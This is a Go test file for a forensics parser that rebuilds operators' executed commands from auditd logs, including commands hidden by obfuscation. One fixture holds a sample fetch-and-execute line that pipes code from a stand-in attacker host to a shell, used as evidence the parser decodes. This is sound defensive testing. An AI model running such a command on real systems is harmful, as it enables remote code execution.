package sessionforensics_test

import (
	"encoding/hex"
	"encoding/json"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/morandeirachema/pamv1/internal/sessionforensics"
)

// sessionStart is the base timestamp the fixtures below are built around.
var sessionStart = time.Unix(1755370800, 0).UTC()

// stamp renders an audit `msg=audit(epoch.ms:serial)` prefix at an offset from
// sessionStart.
func stamp(offset time.Duration, serial string) string {
	t := sessionStart.Add(offset)
	return "msg=audit(" + itoa(t.Unix()) + ".000:" + serial + ")"
}

// itoa renders an epoch second for a fixture stamp.
func itoa(n int64) string { return strconv.FormatInt(n, 10) }

// block builds one ausearch event: the SYSCALL half (identity, process) and the
// EXECVE half (argv), separated the way ausearch separates events.
func block(ts, serial, pid, ppid, exe, execve string) string {
	return "----\ntype=SYSCALL " + ts + ": arch=c000003e syscall=59 success=yes exit=0 ppid=" + ppid +
		" pid=" + pid + " auid=1000 uid=0 gid=0 euid=0 comm=\"sh\" exe=\"" + exe + "\" key=\"pamv1-exec\"\n" +
		"type=EXECVE " + ts + ": " + execve + "\n"
}

// TestParseDecodesWhatTheRecordingHides is the phase's point in one test: an
// operator obfuscates a command so the session recording shows only a base64
// blob piped to a shell, and `stty -echo` could have hidden even that — but the
// target's kernel recorded the DECODED execve, hex-encoded in the audit log
// because it contains spaces, and the reconstruction shows it in the clear.
func TestParseDecodesWhatTheRecordingHides(t *testing.T) {
	// What the kernel saw: `/bin/sh -c curl -s http://evil.example/x | sh`
	hidden := "curl -s http://evil.example/x | sh"
	raw := block(stamp(30*time.Second, "1001"), "1001", "4242", "4200", "/bin/sh",
		`argc=3 a0="/bin/sh" a1="-c" a2=`+hex.EncodeToString([]byte(hidden)))

	rep := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 0)
	if !rep.Available || len(rep.Events) != 1 {
		t.Fatalf("report = %+v", rep)
	}
	e := rep.Events[0]
	if got, want := e.CommandLine(), "/bin/sh -c "+hidden; got != want {
		t.Fatalf("command line = %q, want %q", got, want)
	}
	if e.PID != 4242 || e.PPID != 4200 || e.AUID != "1000" || e.Exe != "/bin/sh" || !e.Success || e.Key != "pamv1-exec" {
		t.Fatalf("event fields = %+v", e)
	}
	if !strings.Contains(rep.Text(), hidden) {
		t.Fatalf("the artifact must show the decoded command:\n%s", rep.Text())
	}
	// And the machine form round-trips for a SIEM.
	var back sessionforensics.Report
	blob, err := json.Marshal(rep)
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(blob, &back); err != nil || len(back.Events) != 1 || back.Events[0].Argv[2] != hidden {
		t.Fatalf("json round-trip: %v %+v", err, back)
	}
}

// TestParseChunkedAndQuotedArgs covers the other two encodings auditd uses: a
// plain quoted argument, and the aN_len/aN[i] chunking that a long argument (a
// base64 payload, a long one-liner) is split into — where concatenating the
// chunks in the wrong order would silently corrupt the evidence.
func TestParseChunkedAndQuotedArgs(t *testing.T) {
	long := strings.Repeat("A", 30) + strings.Repeat("B", 30)
	raw := block(stamp(time.Second, "1002"), "1002", "10", "9", "/usr/bin/python3",
		`argc=3 a0="python3" a1="-c" a2_len=60 a2[0]="`+long[:30]+`" a2[1]="`+long[30:]+`"`)
	rep := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 0)
	if len(rep.Events) != 1 {
		t.Fatalf("report = %+v", rep)
	}
	argv := rep.Events[0].Argv
	if len(argv) != 3 || argv[0] != "python3" || argv[1] != "-c" || argv[2] != long {
		t.Fatalf("argv = %q", argv)
	}
}

// TestParseWindowFiltering proves an artifact carries ONE session's execs: the
// target's audit log holds every session's (including other operators'), and
// bleeding a neighbour's commands into this record would be worse than
// reporting nothing.
func TestParseWindowFiltering(t *testing.T) {
	raw := block(stamp(-time.Hour, "900"), "900", "1", "0", "/usr/bin/id", `argc=1 a0="id"`) +
		block(stamp(10*time.Second, "901"), "901", "2", "1", "/usr/bin/whoami", `argc=1 a0="whoami"`) +
		block(stamp(2*time.Hour, "902"), "902", "3", "1", "/usr/bin/uptime", `argc=1 a0="uptime"`)
	rep := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 0)
	if rep.Scanned != 3 {
		t.Fatalf("scanned = %d, want 3", rep.Scanned)
	}
	if len(rep.Events) != 1 || rep.Events[0].Exe != "/usr/bin/whoami" {
		t.Fatalf("only the in-window exec belongs in the artifact: %+v", rep.Events)
	}
}

// TestParseOrderingAndCap pins that events come back oldest-first and that the
// cap truncates VISIBLY rather than silently.
func TestParseOrderingAndCap(t *testing.T) {
	raw := block(stamp(30*time.Second, "3"), "3", "3", "1", "/bin/c", `argc=1 a0="c"`) +
		block(stamp(10*time.Second, "1"), "1", "1", "1", "/bin/a", `argc=1 a0="a"`) +
		block(stamp(20*time.Second, "2"), "2", "2", "1", "/bin/b", `argc=1 a0="b"`)
	rep := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 0)
	if len(rep.Events) != 3 || rep.Events[0].Exe != "/bin/a" || rep.Events[2].Exe != "/bin/c" {
		t.Fatalf("events out of order: %+v", rep.Events)
	}
	if rep.Truncated {
		t.Fatal("uncapped report should not claim truncation")
	}
	capped := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 2)
	if len(capped.Events) != 2 || !capped.Truncated || !strings.Contains(capped.Text(), "TRUNCATED") {
		t.Fatalf("cap must truncate visibly: %+v", capped)
	}
}

// TestParseUnavailableIsNotEmpty is the honesty property: "the target could not
// tell us" must never render as "nothing ran". A target with no auditd, a
// credential without permission, and a `tail -c` cut that leaves nothing
// parsable all produce an UNAVAILABLE report carrying the reason.
func TestParseUnavailableIsNotEmpty(t *testing.T) {
	for name, raw := range map[string]string{
		"no output":       "",
		"whitespace only": "   \n\n",
		"permission denied (the target's own error text)": "ausearch: cannot open /var/log/audit/audit.log: Permission denied\n",
		"command not found": "bash: ausearch: command not found\n",
	} {
		t.Run(name, func(t *testing.T) {
			rep := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 0)
			if rep.Available || len(rep.Events) != 0 || rep.Note == "" {
				t.Fatalf("report = %+v", rep)
			}
			if !strings.Contains(rep.Text(), "UNAVAILABLE") {
				t.Fatalf("the artifact must say so plainly:\n%s", rep.Text())
			}
		})
	}
	// A truncated leading block (what `tail -c` produces) is skipped, and the
	// intact records after it still parse.
	partial := "pid=99 exe=\"/bin/cut-off\"\ntype=EXECVE msg=audit(1.000:0): argc=1 a0=\"x\"\n" +
		block(stamp(5*time.Second, "77"), "77", "5", "1", "/bin/ls", `argc=1 a0="ls"`)
	rep := sessionforensics.Parse(partial, sessionStart, sessionStart.Add(time.Minute), 0)
	if !rep.Available || len(rep.Events) != 1 || rep.Events[0].Exe != "/bin/ls" {
		t.Fatalf("a cut leading record must be skipped, not fatal: %+v", rep)
	}
}

// TestCommandIsFixedAndReadOnly pins the command itself: it is not
// configurable, it only reads, and it bounds what a chatty target can return.
func TestCommandIsFixedAndReadOnly(t *testing.T) {
	cmd := sessionforensics.Command
	for _, want := range []string{"ausearch", "-m EXECVE", "-ts today", "tail -c"} {
		if !strings.Contains(cmd, want) {
			t.Fatalf("command %q missing %q", cmd, want)
		}
	}
	for _, forbidden := range []string{"rm ", ">", "sudo", ";"} {
		if strings.Contains(cmd, forbidden) {
			t.Fatalf("the fixed forensic command must stay read-only: %q contains %q", cmd, forbidden)
		}
	}
}

// TestArgvTruncationIsVisible bounds one reconstructed line so a megabyte-long
// argv cannot dominate an artifact a human reads — visibly, with an ellipsis.
func TestArgvTruncationIsVisible(t *testing.T) {
	huge := strings.Repeat("x", 9000)
	raw := block(stamp(time.Second, "5"), "5", "5", "1", "/bin/sh", `argc=2 a0="sh" a1=`+hex.EncodeToString([]byte(huge)))
	rep := sessionforensics.Parse(raw, sessionStart, sessionStart.Add(time.Minute), 0)
	if len(rep.Events) != 1 {
		t.Fatalf("report = %+v", rep)
	}
	line := rep.Events[0].CommandLine()
	if len(line) > 4200 || !strings.HasSuffix(line, "…") {
		t.Fatalf("argv truncation should be bounded and visible: %d chars", len(line))
	}
	// The full argument is still in the machine form — the truncation is a
	// rendering bound, not evidence destruction.
	if len(rep.Events[0].Argv[1]) != len(huge) {
		t.Fatal("the parsed argument itself must not be truncated")
	}
}
